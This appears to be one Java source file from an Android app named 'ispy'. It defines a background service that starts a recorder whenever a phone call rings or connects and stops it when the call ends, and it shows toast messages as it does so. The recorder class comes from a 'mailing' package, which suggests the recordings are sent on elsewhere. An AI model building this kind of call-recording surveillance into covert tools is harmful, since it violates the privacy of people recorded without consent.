package com.softs.aben.ispy;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.softs.aben.ispy.mailing.BRecorder;

public class MyPhoneRecService extends Service {
    public MyPhoneRecService() {
    }
    BRecorder  rec;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {//phone Recorder
            rec=new BRecorder();
            TelephonyManager telephonyManager =
                    (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
            PhoneStateListener callStateListener = new PhoneStateListener() {
                public void onCallStateChanged(int state, String incomingNumber)
                {
                    if(state==TelephonyManager.CALL_STATE_RINGING|| state==TelephonyManager.CALL_STATE_OFFHOOK){
                        rec.start();
                        Toast.makeText(getApplicationContext(),"Phone Is Currently in a call",
                                Toast.LENGTH_SHORT).show();
                    }
                    if(state==TelephonyManager.CALL_STATE_IDLE) {

                        rec.stop();
                        Toast.makeText(getApplicationContext(), "phone is neither ringing nor in a call",
                                Toast.LENGTH_SHORT).show();
                    }
                }
            };
            telephonyManager.listen(callStateListener,PhoneStateListener.LISTEN_CALL_STATE);
            Toast.makeText(getApplicationContext(), "Phone Listning Mode activated",Toast.LENGTH_SHORT).show();
        }
        catch (Exception ex){
            ex.printStackTrace();
        }
        return super.onStartCommand(intent, flags, startId);
    }
}
